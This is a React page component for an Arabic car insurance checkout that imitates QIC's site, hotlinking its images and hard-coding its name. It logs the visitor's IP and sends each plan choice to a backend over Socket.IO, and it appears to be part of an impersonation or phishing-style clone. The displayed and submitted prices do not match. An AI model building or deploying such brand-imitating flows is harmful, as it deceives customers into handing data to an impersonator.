...
import '../styles/SelectInsurance.css';

const SelectInsurance = () => {
  const navigate = useNavigate();
  const { socket, userIp } = useSocket();
  const [carValue, setCarValue] = useState(315700);
  const [showCarValuePopup, setShowCarValuePopup] = useState(false);
  const [showDetailsPopup, setShowDetailsPopup] = useState(null); // 'comprehensive' or 'third-party'
  const [tempCarValue, setTempCarValue] = useState(315700);

  const minValue = 252500;
  const maxValue = 378800;
  ...
  const calculateMonthlyPrice = () => {
    const basePrice = 4736;
    const monthly = basePrice / 12;
    return monthly.toFixed(2);
  };

  const handleSliderChange = (e) => {
    setTempCarValue(parseInt(e.target.value));
  };

  const handleSaveCarValue = () => {
    setCarValue(tempCarValue);
    setShowCarValuePopup(false);
  };

  const handleSelectPlan = (planType) => {
    sessionStorage.setItem('selectedPlan', planType);
    sessionStorage.setItem('carValue', carValue);
    
    // Send to backend via Socket.IO
    if (socket && userIp) {
      socket.emit('submitSelectInsurance', {
        ip: userIp,
        insuranceType: planType === 'comprehensive' ? 'شامل' : 'طرف ثالث',
        selectedCompany: 'QIC',
        basePrice: planType === 'comprehensive' ? 4736 : 1200,
        selectedOptions: [],
        totalPrice: planType === 'comprehensive' ? 4736 : 1200
      });
    }
    
    navigate('/plate-number');
  };

  return (
    <div className="select-insurance-page rtl">
      ...
      <div className="progress">
        <div className="scale-progress">
          <div className="light" style={{ width: '61%' }}></div>
          <div className="green" style={{ width: '53%' }}></div>
        </div>
      </div>

      <div className="select-insurance-content">
        <h1>إختر نوع التأمين</h1>

        <div className="car-info">
          <div className="car-details">
            <div className="car-name">Toyota Land Cruiser VXS, 2026</div>
          </div>
        </div>

        <div className="insurance-plans">
          {/* التأمين الشامل */}
          <div className="insurance-card featured">
            <div className="coins-badge">
              <span className="coins-prefix">+</span>5000
              <img src="/assets/images/coin.BETny5EB.png" alt="Coin" className="coin-icon" />
            </div>
            <div className="badge">يفضله العملاء</div>

            <div className="card-header">
              <h2>التأمين الشامل</h2>
              <div className="price">
                <div className="price-main">{calculateMonthlyPrice()} ريال قطري شهريا</div>
                <div className="price-sub">دفعة لمرة واحدة ريال قطري {formatPrice(4736)}</div>
              </div>
              <button className="car-value-btn" onClick={() => setShowCarValuePopup(true)}>
                <span>بناءً على قيمة سيارتك</span>
                <div className="value-display">
                  <span>{formatPrice(carValue)} ر.ق</span>
                  <svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path fillRule="evenodd" clipRule="evenodd" d="M9.19494 0.529247C9.45529 0.268897 9.8774 0.268897 10.1377 0.529247L13.4711 3.86258C13.7314 4.12293 13.7314 4.54504 13.4711 4.80539L4.80441 13.4721C4.67939 13.5971 4.50982 13.6673 4.33301 13.6673H0.999674C0.631485 13.6673 0.333008 13.3688 0.333008 13.0007V9.66732C0.333008 9.49051 0.403246 9.32094 0.52827 9.19591L9.19494 0.529247ZM1.66634 9.94346V12.334H4.05687L12.0569 4.33398L9.66634 1.94346L1.66634 9.94346Z" fill="currentColor"/>
                  </svg>
                </div>
              </button>
            </div>

            <button className="select-btn" onClick={() => handleSelectPlan('comprehensive')}>
              إختر
            </button>
            ...
            <ul className="features-list">
              <li>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M20 6L9 17L4 12" stroke="#6568F4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                <span>المسؤولية ضد الغير</span>
              </li>
              <li>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M20 6L9 17L4 12" stroke="#6568F4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                <span>المسؤولية تجاه الركاب</span>
              </li>
              <li>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M20 6L9 17L4 12" stroke="#6568F4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                <span>الضرر الذاتي</span>
              </li>
              <li>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M20 6L9 17L4 12" stroke="#6568F4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                <span>إصلاح الوكالة</span>
              </li>
              <li>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M20 6L9 17L4 12" stroke="#6568F4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                <span>عدم احتساب استهلاك قطع الغيار</span>
              </li>
              <li>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M20 6L9 17L4 12" stroke="#6568F4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                <span>الحوادث مجهولة المتسبب</span>
              </li>
            </ul>

            <button className="learn-more" onClick={() => setShowDetailsPopup('comprehensive')}>المزيد</button>
          </div>

          {/* التأمين ضد الغير */}
          <div className="insurance-card">
            <div className="coins-badge">
              <span className="coins-prefix">+</span>2000
              <img src="/assets/images/coin.BETny5EB.png" alt="Coin" className="coin-icon" />
            </div>

            <div className="card-header">
              <h2>التأمين ضد الغير</h2>
              <div className="price">
                <div className="price-main">500 ر.ق</div>
                <div className="price-sub">دفعة لمرة واحدة فقط</div>
              </div>
              <div className="fixed-price">سعر ثابت</div>
            </div>

            <button className="select-btn" onClick={() => handleSelectPlan('third-party')}>
              إختر
            </button>
            ...
            <ul className="features-list">
              ...
              <li>
                ...
                <span>خدمة المساعدة على الطريق 24/7</span>
                <span className="additional-badge">تغطيات إضافية</span>
              </li>
              <li className="disabled">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path fillRule="evenodd" clipRule="evenodd" d="M18.7071 6.70711C19.0976 6.31658 19.0976 5.68342 18.7071 5.29289C18.3166 4.90237 17.6834 4.90237 17.2929 5.29289L12 10.5858L6.70711 5.29289C6.31658 4.90237 5.68342 4.90237 5.29289 5.29289C4.90237 5.68342 4.90237 6.31658 5.29289 6.70711L10.5858 12L5.29289 17.2929C4.90237 17.6834 4.90237 18.3166 5.29289 18.7071C5.68342 19.0976 6.31658 19.0976 6.70711 18.7071L12 13.4142L17.2929 18.7071C17.6834 19.0976 18.3166 19.0976 18.7071 18.7071C19.0976 18.3166 19.0976 17.6834 18.7071 17.2929L13.4142 12L18.7071 6.70711Z" fill="#D3D3EB" fillOpacity="0.4"/>
                </svg>
                <span>الضرر الذاتي</span>
              </li>
            </ul>

            <button className="learn-more" onClick={() => setShowDetailsPopup('third-party')}>المزيد</button>
          </div>
        </div>
      </div>
      ...
      {/* Car Value Popup */}
      {showCarValuePopup && (
        <div className="popup-overlay" onClick={() => setShowCarValuePopup(false)}>
          <div className="popup-content" onClick={(e) => e.stopPropagation()}>
            <button className="popup-close" onClick={() => setShowCarValuePopup(false)}>
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path fillRule="evenodd" clipRule="evenodd" d="M18.7071 6.70711C19.0976 6.31658 19.0976 5.68342 18.7071 5.29289C18.3166 4.90237 17.6834 4.90237 17.2929 5.29289L12 10.5858L6.70711 5.29289C6.31658 4.90237 5.68342 4.90237 5.29289 5.29289C4.90237 5.68342 4.90237 6.31658 5.29289 6.70711L10.5858 12L5.29289 17.2929C4.90237 17.6834 4.90237 18.3166 5.29289 18.7071C5.68342 19.0976 6.31658 19.0976 6.70711 18.7071L12 13.4142L17.2929 18.7071C17.6834 19.0976 18.3166 19.0976 18.7071 18.7071C19.0976 18.3166 19.0976 17.6834 18.7071 17.2929L13.4142 12L18.7071 6.70711Z" fill="#526C82"/>
              </svg>
            </button>

            <h2>قيمة السيارة</h2>
            <p className="popup-description">
              نحن نستخدم متوسط سعر سيارتك في السوق لحساب التكلفة الأساسية لوثيقة التأمين لذا قد يتغير السعر
            </p>

            <div className="value-input-wrapper">
              <input
                type="text"
                value={formatPrice(tempCarValue)}
                readOnly
            ...
            <button className="save-btn" onClick={handleSaveCarValue}>
              حفظ
            </button>

            <div className="popup-footer">
              <button className="cancel-btn" onClick={() => setShowCarValuePopup(false)}>
                إلغاء
              </button>
              <p className="contact-text">
                <a href="/contact">تواصل معنا</a> في حال رغبتك في اختيار سعر غير ذلك
              </p>
            </div>
          </div>
        </div>
      ...
      {/* Plan Details Popup */}
      {showDetailsPopup && (
        <div className="plan-popup popup-wrapper" style={{ zIndex: 1001 }} onClick={() => setShowDetailsPopup(null)}>
          <div className="popup popup_big rtl" onClick={(e) => e.stopPropagation()}>
            <div className="popup__close">
              <button className="button-icon popup__close-icon" onClick={() => setShowDetailsPopup(null)}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path fillRule="evenodd" clipRule="evenodd" d="M18.7071 6.70711C19.0976 6.31658 19.0976 5.68342 18.7071 5.29289C18.3166 4.90237 17.6834 4.90237 17.2929 5.29289L12 10.5858L6.70711 5.29289C6.31658 4.90237 5.68342 4.90237 5.29289 5.29289C4.90237 5.68342 4.90237 6.31658 5.29289 6.70711L10.5858 12L5.29289 17.2929C4.90237 17.6834 4.90237 18.3166 5.29289 18.7071C5.68342 19.0976 6.31658 19.0976 6.70711 18.7071L12 13.4142L17.2929 18.7071C17.6834 19.0976 18.3166 19.0976 18.7071 18.7071C19.0976 18.3166 19.0976 17.6834 18.7071 17.2929L13.4142 12L18.7071 6.70711Z" fill="#778A99" fillOpacity="0.8"></path>
                </svg>
              </button>
            </div>

            <div className="plan-details-popup">
              <div className="plan-details-popup__content">
                <div className="plan-details-od__head">
                  <div className="plan-details-od__head-title">
                    {showDetailsPopup === 'comprehensive' ? 'التأمين الشامل' : 'التأمين ضد الغير'}
                  </div>
                  <div className="plan-details-od__head-subtitle">وصف عام لخطة التأمين</div>
                </div>

                {showDetailsPopup === 'comprehensive' && (
                  <div className="plan-details-od__card">
                    <div className="plan-details-od__card-title">ادفع بالتقسيط</div>
                    <div className="plan-details-od__card-desc">
                      قم بتقسيم سعر تأمينك على 12 قسط شهري بدون رسوم واستمتع بحماية كاملة لمدة عام كامل
                    </div>
                    <img 
                      src="https://static.qic.online/qic-online-front/89eba8a7/_nuxt/policy-details-installment.Cq6FRXz0.png" 
                      className="plan-details-od__img"
                      alt="تقسيط"
                    />
                  </div>
                )}
                ...
                <div className="covers-list">
                  <div className="covers-list__head">
                    <div className="covers-list__title">يمنحك تغطية على</div>
                  </div>
                  <ul className="covers-list__covers">
                    {showDetailsPopup === 'comprehensive' ? (
                      <>
                        <li className="covers-list__item">
                          <div className="covers-list__cover">
                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                              <path d="M20 6L9 17L4 12" stroke="#6568F4" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
                            </svg>
                            <div className="covers-list__cover-text">
                              <div className="covers-list__cover-title">فقدان سيارتك أو تلفها</div>
                              <div className="covers-list__cover-description">الخسارة والأضرار التي تلحق بسيارتك</div>
                            </div>
                          </div>
                        </li>
                        <li className="covers-list__item">
                          <div className="covers-list__cover">
                            ...
                            <div className="covers-list__cover-text">
                              <div className="covers-list__cover-title">أضرار مركبة الغير</div>
                              <div className="covers-list__cover-description">تكاليف المسؤولية عن الأضرار التي تلحقها بمركبة الطرف الثالث</div>
                            </div>
                          </div>
                        </li>
                        <li className="covers-list__item">
                          <div className="covers-list__cover">
                            ...
                            <div className="covers-list__cover-text">
                              <div className="covers-list__cover-title">أضرار ممتلكات الغير</div>
                              <div className="covers-list__cover-description">الضرر الذي قد تسببه عن طريق الخطأ للآخرين وممتلكاتهم</div>
                            </div>
                          </div>
                        </li>
                        <li className="covers-list__item">
                          <div className="covers-list__cover">
                            ...
                            <div className="covers-list__cover-text">
                              <div className="covers-list__cover-title">الإصابات والوفاة</div>
                              <div className="covers-list__cover-description">تغطية الإصابات والوفاة التي قد تتعرض لها أو التي قد تسببها للآخرين</div>
                            </div>
                          </div>
                        </li>
                        <li className="covers-list__item">
                          <div className="covers-list__cover">
                            ...
                            <div className="covers-list__cover-text">
                              <div className="covers-list__cover-title">السرقة</div>
                              <div className="covers-list__cover-description">الخسائر التي تتكبدها في حالة سرقة سيارتك</div>
                            </div>
                          </div>
                        </li>
                        <li className="covers-list__item">
                          <div className="covers-list__cover">
                            ...
                            <div className="covers-list__cover-text">
                              <div className="covers-list__cover-title">الحريق</div>
                              <div className="covers-list__cover-description">الأضرار الناجمة عن حوادث الحريق</div>
                            </div>
                          </div>
                        </li>
                        <li className="covers-list__item">
                          <div className="covers-list__cover">
                            ...
                            <div className="covers-list__cover-text">
                              <div className="covers-list__cover-title">التخريب</div>
                              <div className="covers-list__cover-description">الأضرار التي تلحق بممتلكاتك بسبب أعمال التخريب</div>
                            </div>
                          </div>
                        </li>
                      </>
                      ...
                      <>
                        <li className="covers-list__item">
                          <div className="covers-list__cover">
                            ...
                            <div className="covers-list__cover-text">
                              <div className="covers-list__cover-title">المسؤولية ضد الغير</div>
                              <div className="covers-list__cover-description">تغطية الأضرار التي قد تلحقها بممتلكات الآخرين</div>
                            </div>
                          </div>
                        </li>
                        <li className="covers-list__item">
                          <div className="covers-list__cover">
                            ...
                            <div className="covers-list__cover-text">
                              <div className="covers-list__cover-title">المسؤولية تجاه الركاب</div>
                              <div className="covers-list__cover-description">تغطية الإصابات للركاب في سيارتك</div>
                            </div>
                          </div>
                        </li>
                      </>
                ...
                {showDetailsPopup === 'comprehensive' && (
                  <div className="covers-list">
                    <div className="covers-list__head">
                      <div className="covers-list__title">التغطيات الإضافية المتاحة</div>
                      <div className="covers-list__subtitle">يمكنك إضافتهم في الخطوة التالية</div>
                    </div>
                    <ul className="covers-list__covers">
                      <li className="covers-list__item">
                        <div className="covers-list__cover">
                          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none">
                            <path d="M12 8V16M8 12H16M22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12Z" stroke="#1C1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
                          </svg>
                          <div className="covers-list__cover-text">
                            <div className="covers-list__cover-title">خدمة المساعدة على الطريق 24/7</div>
                            <div className="covers-list__cover-description">تشمل الخدمة إعادة التزود بالوقود وتغيير الإطارات، والقطر والمساعدة في فتح السيارة، وإعادة تشغيل البطارية والمزيد. يتم تقديم الخدمة في قطر ودول مجلس التعاون الخليجي</div>
                          </div>
                        </div>
                      </li>
                      <li className="covers-list__item">
                        <div className="covers-list__cover">
                          ...
                          <div className="covers-list__cover-text">
                            <div className="covers-list__cover-title">إصلاح الوكالة</div>
                            <div className="covers-list__cover-description">يغطي تكلفة الإصلاحات في ورشة وكالة السيارات</div>
                          </div>
                        </div>
                      </li>
                      <li className="covers-list__item">
                        <div className="covers-list__cover">
                          ...
                          <div className="covers-list__cover-text">
                            <div className="covers-list__cover-title">تأمين الحوادث الشخصية</div>
                            <div className="covers-list__cover-description">دفع مبلغ للسائق والركاب، في حالة الوفاة أو العجز نتيجة حادث، علاوة على ما يغطيه التأمين الأساسي الكامل</div>
                          </div>
                        </div>
                      </li>
                      <li className="covers-list__item">
                        <div className="covers-list__cover">
                          ...
                          <div className="covers-list__cover-text">
                            <div className="covers-list__cover-title">عدم احتساب استهلاك قطع الغيار</div>
                            <div className="covers-list__cover-description">إذا كانت سيارتك بحاجة إلى إصلاح فسيتم استبدال قطع غيارها التالفة دون أي تكلفة إضافية</div>
                          </div>
                        </div>
                      </li>
                      <li className="covers-list__item">
                        <div className="covers-list__cover">
                          ...
                          <div className="covers-list__cover-text">
                            <div className="covers-list__cover-title">تغطية الطرق الوعرة</div>
                            <div className="covers-list__cover-description">تؤمن هذه التغطية سيارتك على الطرق غير المعبدة ما عدا الكثبان الرملية أو التضاريس المماثلة</div>
                          </div>
                        </div>
                      </li>
                      <li className="covers-list__item">
                        <div className="covers-list__cover">
                          ...
                          <div className="covers-list__cover-text">
                            <div className="covers-list__cover-title">سيارة بديلة لمدة 10 أيام</div>
                            <div className="covers-list__cover-description">تزويدك بسيارة بديلة لمدة تصل إلى 10 أيام من تاريخ وقوع الحادث</div>
                          </div>
                        </div>
                      </li>
                      <li className="covers-list__item">
                        <div className="covers-list__cover">
                          ...
                          <div className="covers-list__cover-text">
                            <div className="covers-list__cover-title">تغطية الطرق الوعرة 360</div>
                            <div className="covers-list__cover-description">توسيع تغطية الطرق الوعرة لتشمل حوادث الطرق غير المعبدة والكثبان الرملية</div>
                          </div>
                        </div>
                      </li>
                      <li className="covers-list__item">
                        <div className="covers-list__cover">
                          ...
                          <div className="covers-list__cover-text">
                            <div className="covers-list__cover-title">الحوادث مجهولة المتسبب</div>
                            <div className="covers-list__cover-description">يغطي سيارتك في حالة وقوع حادث عندما لا تتمكن من تحديد الشخص المتسبب في ذلك الحادث</div>
                          </div>
                        </div>
                      </li>
                      <li className="covers-list__item">
                        <div className="covers-list__cover">
                          ...
                          <div className="covers-list__cover-text">
                            <div className="covers-list__cover-title">التأمين الشامل بدول مجلس التعاون الخليجي</div>
                            <div className="covers-list__cover-description">تفعيل التأمين الشامل ليغطي الأضرار التي قد تلحق بالسيارة المؤمن عليها في الكويت، عمان، والإمارات العربية المتحدة. لا يتم تغطية أضرار الغير في هذه الدول</div>
                          </div>
                        </div>
                      </li>
                    </ul>
              ...
              <button className="btn btn--secondary btn--medium" onClick={() => setShowDetailsPopup(null)}>
                إغلاق
              </button>
            </div>
          </div>
